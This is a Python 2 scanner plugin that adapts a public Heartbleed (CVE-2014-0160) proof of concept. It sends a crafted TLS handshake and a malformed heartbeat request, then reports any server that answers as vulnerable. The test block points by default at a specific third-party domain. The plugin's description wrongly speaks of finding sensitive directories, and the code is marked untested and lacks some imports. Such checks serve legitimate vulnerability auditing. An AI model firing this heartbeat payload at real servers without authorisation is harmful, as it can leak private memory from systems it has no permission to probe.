#!/usr/bin/python2.7
#coding:utf-8

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.

import struct
import socket
import time
import select

from dummy import *

info = {
	'NAME':'OpenSSL TLS Memory Disclosure',
	'AUTHOR':'▶win7s◀,yangbh',
	'TIME':'20140729',
	'WEB':'https://www.yascanner.com/#!/p/1/s/4/',
	'DESCRIPTION':'Sensitive file or directory such as: /admin, /conf, /backup /db'
}

def h2bin(x):
	return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

hb = h2bin('''
18 03 02 00 03
01 40 00
''')

def recvall(s, length, timeout=5):
	endtime = time.time() + timeout
	rdata = ''
	remain = length
	while remain > 0:
		rtime = endtime - time.time()
		if rtime < 0:
			return None
		r, w, e = select.select([s], [], [], 5)
		if s in r:
			data = s.recv(remain)
			if not data:
				return None
			rdata += data
			remain -= len(data)
	return rdata

def recvmsg(s):
	hdr = recvall(s, 5)
	if hdr is None:
		return None, None, None
	typ, ver, ln = struct.unpack('>BHH', hdr)
	pay = recvall(s, ln, 10)
	if pay is None:
		return None, None, None
	return typ, ver, pay

def hit_hb(s):
	s.send(hb)
	while True:
		typ, ver, pay = recvmsg(s)
		if typ is None:
			return False

		if typ == 24:
			return True

		if typ == 21:
			return False

def assign(service, arg):
	if service == "ssl":
		return True, arg

def Assign(services):
	if services.has_key('ip'):
		host = services['ip']
		if services.has_key('ports'):
			return True
	return False

def Audit(services):
	retinfo = None
	output = 'plugin run' + os.linesep
	
	host = services['ip']
	if 443 in services['ports']:
		port = 443
	else:
		return(None,output)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, port))
		s.send(hello)
		while True:
			typ, ver, pay = recvmsg(s)
			if typ == None:
				return(None,output)
			# Look for server hello done message.
			if typ == 22 and ord(pay[0]) == 0x0E:
				break
		s.send(hb)
		if hit_hb(s):
			retinfo = {'level':'high','content':host}
			security_hole(host)
		s.close()

	except:
		pass

	return(retinfo,output)
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__ == '__main__':
	host ='www.eguan.cn'
	if len(sys.argv) ==  2:
		host = sys.argv[1]
	services = {'ip':host,'ports':[443,80]}
	pprint(Audit(services))
	pprint(services)
